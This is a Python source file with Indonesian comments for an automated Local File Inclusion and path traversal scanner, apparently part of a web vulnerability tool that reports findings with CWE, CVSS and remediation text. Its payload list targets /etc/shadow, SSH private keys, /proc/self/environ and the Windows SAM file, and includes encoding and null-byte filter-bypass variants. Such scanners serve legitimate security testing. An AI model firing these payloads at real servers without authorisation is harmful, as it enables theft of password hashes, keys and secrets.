"""
LFI / Path Traversal Detector
================================
Mendeteksi Local File Inclusion (LFI) dan Directory Path Traversal pada:
  • Parameter URL (query string)
  • Path segments dalam URL
  • Form input fields

Teknik deteksi:
  1. Classic traversal: ../../../etc/passwd
  2. URL encoding bypass: %2e%2e%2f
  3. Double encoding: %252e%252e%252f
  4. Filter bypass (null-byte, extra dots): ....//....//
  5. Windows path traversal: ..\\..\\windows\\win.ini
  6. Signature matching dalam response body
"""

import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any, Optional

# ---------------------------------------------------------------------------
# Platform-specific traversal payloads
# ---------------------------------------------------------------------------
LFI_PAYLOADS = [
    # ── Unix / Linux ──────────────────────────────────────────────────────
    {
        "name": "Classic Unix Traversal (depth 5)",
        "path": "../../../../../etc/passwd",
        "signatures": ["root:x:0:0", "bin:x:", "/bin/bash", "/bin/sh", "daemon:x:"],
        "platform": "Unix"
    },
    {
        "name": "URL-Encoded Unix Traversal",
        "path": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "signatures": ["root:x:0:0", "bin:x:", "/bin/bash"],
        "platform": "Unix"
    },
    {
        "name": "Double-Encoded Unix Traversal",
        "path": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "signatures": ["root:x:0:0", "bin:x:", "/bin/bash"],
        "platform": "Unix"
    },
    {
        "name": "Null-Byte Terminated Traversal",
        "path": "../../../../../etc/passwd%00",
        "signatures": ["root:x:0:0", "bin:x:"],
        "platform": "Unix"
    },
    {
        "name": "Filter Bypass (....//)",
        "path": "....//....//....//....//etc/passwd",
        "signatures": ["root:x:0:0", "bin:x:"],
        "platform": "Unix"
    },
    {
        "name": "Slash-Only Traversal",
        "path": "/etc/passwd",
        "signatures": ["root:x:0:0", "bin:x:", "/bin/bash"],
        "platform": "Unix"
    },
    # Sensitive Linux files
    {
        "name": "Proc Self Environ (Environment Variable Leak)",
        "path": "../../../../../proc/self/environ",
        "signatures": ["PATH=", "HOME=", "USER=", "HTTP_"],
        "platform": "Unix"
    },
    {
        "name": "Proc Self Cmdline (Process Commandline)",
        "path": "../../../../../proc/self/cmdline",
        "signatures": ["python", "node", "java", "php", "ruby", "uvicorn"],
        "platform": "Unix"
    },
    {
        "name": "/etc/shadow (Password Hash Leak)",
        "path": "../../../../../etc/shadow",
        "signatures": ["root:", "$6$", "$5$", "$2a$"],
        "platform": "Unix"
    },
    {
        "name": "SSH Private Key via LFI",
        "path": "../../../../../root/.ssh/id_rsa",
        "signatures": ["-----BEGIN", "PRIVATE KEY", "RSA PRIVATE"],
        "platform": "Unix"
    },
    {
        "name": "/etc/hosts Disclosure",
        "path": "../../../../../etc/hosts",
        "signatures": ["127.0.0.1", "localhost", "::1"],
        "platform": "Unix"
    },
    # ── Windows ────────────────────────────────────────────────────────────
    {
        "name": "Windows win.ini Traversal",
        "path": "..\\..\\..\\..\\..\\windows\\win.ini",
        "signatures": ["[fonts]", "[extensions]", "[files]", "; for 16-bit app support"],
        "platform": "Windows"
    },
    {
        "name": "Windows Boot.ini Traversal",
        "path": "..\\..\\..\\..\\..\\boot.ini",
        "signatures": ["[boot loader]", "[operating systems]", "partition="],
        "platform": "Windows"
    },
    {
        "name": "Windows SAM Database Traversal",
        "path": "..\\..\\..\\..\\..\\windows\\system32\\config\\SAM",
        "signatures": ["REGF"],
        "platform": "Windows"
    },
    # ── PHP Application Specific ──────────────────────────────────────────
    {
        "name": "PHP Wrapper (php://filter base64)",
        "path": "php://filter/convert.base64-encode/resource=index.php",
        "signatures": ["PD9waHA", "<?php", "base64"],   # base64 of <?php
        "platform": "PHP"
    },
    {
        "name": "PHP Wrapper (file:// to /etc/passwd)",
        "path": "file:///etc/passwd",
        "signatures": ["root:x:0:0", "bin:x:"],
        "platform": "PHP"
    },
]

# Parameters commonly used for file inclusion
FILE_PARAMS = [
    "file", "page", "include", "path", "template", "view",
    "load", "read", "open", "fetch", "document", "folder",
    "root", "pg", "style", "lang", "dir", "layout", "mod",
    "module", "conf", "config", "prefix", "action", "content"
]


class LFIDetector:
    """
    Detektor Local File Inclusion dan Path Traversal komprehensif.
    """

    async def scan_urls(
        self,
        urls: List[str],
        forms: Optional[List[Dict[str, Any]]] = None,
        emit_log=None
    ) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        tested_keys: set = set()

        async with httpx.AsyncClient(
            verify=False, timeout=8.0, follow_redirects=True
        ) as client:
            # ---- 1. Test known redirect parameters in existing URLs ----
            for url in urls:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)

                for param_name in list(params.keys()):
                    if param_name.lower() not in FILE_PARAMS:
                        continue

                    key = f"LFI:{parsed.netloc}{parsed.path}:{param_name}"
                    if key in tested_keys:
                        continue
                    tested_keys.add(key)

                    finding = await self._probe_param(
                        client, url, parsed, params, param_name, emit_log
                    )
                    if finding:
                        findings.append(finding)

            # ---- 2. Inject file-like params into all URLs (param fishing) ----
            for url in urls[:8]:
                parsed = urlparse(url)

                for fp in FILE_PARAMS[:10]:
                    key = f"LFI_INJECT:{parsed.netloc}{parsed.path}:{fp}"
                    if key in tested_keys:
                        continue
                    tested_keys.add(key)

                    if emit_log:
                        await emit_log(f"[LFI-INJECT] Injecting param '{fp}' on {parsed.path}")

                    for payload_def in LFI_PAYLOADS[:5]:
                        test_params = dict(parse_qs(parsed.query))
                        test_params[fp] = [payload_def["path"]]
                        new_query = urlencode(test_params, doseq=True)
                        fuzz_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, new_query, parsed.fragment
                        ))

                        try:
                            res = await client.get(fuzz_url, timeout=7.0)
                            matched_sig = self._check_signatures(res.text, payload_def["signatures"])
                            if matched_sig and res.status_code == 200:
                                findings.append(self._build_finding(
                                    fp, payload_def, matched_sig, fuzz_url
                                ))
                                break
                        except Exception:
                            continue

            # ---- 3. Form inputs ----
            if forms:
                for form in forms:
                    form_url = form.get("url")
                    method = form.get("method", "GET").upper()
                    inputs = form.get("inputs", [])
                    if not form_url or not inputs:
                        continue

                    for inp in inputs:
                        if inp.lower() not in FILE_PARAMS:
                            continue

                        form_key = f"LFI_FORM:{form_url}:{inp}"
                        if form_key in tested_keys:
                            continue
                        tested_keys.add(form_key)

                        for payload_def in LFI_PAYLOADS[:3]:
                            form_data = {i: "test" for i in inputs}
                            form_data[inp] = payload_def["path"]

                            if emit_log:
                                await emit_log(
                                    f"[LFI-FORM] Testing '{inp}' "
                                    f"on {form_url} ({method})"
                                )

                            try:
                                if method == "POST":
                                    res = await client.post(form_url, data=form_data, timeout=7.0)
                                else:
                                    res = await client.get(form_url, params=form_data, timeout=7.0)

                                matched_sig = self._check_signatures(res.text, payload_def["signatures"])
                                if matched_sig and res.status_code == 200:
                                    findings.append(self._build_finding(
                                        inp, payload_def, matched_sig, form_url
                                    ))
                                    break
                            except Exception:
                                continue

        return findings

    async def _probe_param(
        self, client, url, parsed, params, param_name, emit_log
    ) -> Optional[Dict[str, Any]]:
        for payload_def in LFI_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = [payload_def["path"]]
            new_query = urlencode(test_params, doseq=True)
            fuzz_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            if emit_log:
                await emit_log(
                    f"[LFI-PROBE] {payload_def['name']} on '{param_name}' "
                    f"({parsed.path})"
                )

            try:
                res = await client.get(fuzz_url, timeout=7.0)
                matched_sig = self._check_signatures(res.text, payload_def["signatures"])
                if matched_sig and res.status_code == 200:
                    return self._build_finding(param_name, payload_def, matched_sig, fuzz_url)
            except Exception:
                continue

        return None

    def _check_signatures(self, body: str, signatures: List[str]) -> Optional[str]:
        for sig in signatures:
            if sig.lower() in body.lower():
                return sig
        return None

    def _build_finding(
        self, param: str, payload_def: Dict, matched_sig: str, fuzz_url: str
    ) -> Dict[str, Any]:
        return {
            "title": f"Path Traversal / Local File Inclusion (LFI) via '{param}' [{payload_def['platform']}]",
            "severity": "Critical",
            "cwe": "CWE-22",
            "owasp_category": "A01:2021-Broken Access Control",
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",  # 8.6 High
            "description": (
                f"Parameter '{param}' rentan terhadap Path Traversal — teknik {payload_def['name']}. "
                f"Penyerang dapat membaca file sistem sensitif di server (/{payload_def['platform']} platform). "
                "Dalam skenario terburuk, LFI dapat dieksploitasi menjadi Remote Code Execution (RCE) "
                "via PHP log poisoning atau /proc/self/environ injection."
            ),
            "remediation": (
                "Validasi ketat semua input parameter file: hanya izinkan karakter alfanumerik dan "
                "karakter aman tertentu. Gunakan `realpath()` dan verifikasi hasil path berada dalam "
                "direktori yang diizinkan (`chroot` jail). Jangan gunakan input pengguna langsung "
                "sebagai argumen fungsi file-include."
            ),
            "evidence": (
                f"Payload '{payload_def['path'][:80]}' menghasilkan signature "
                f"'{matched_sig}' dalam response body (HTTP 200)."
            ),
            "target_url": fuzz_url
        }
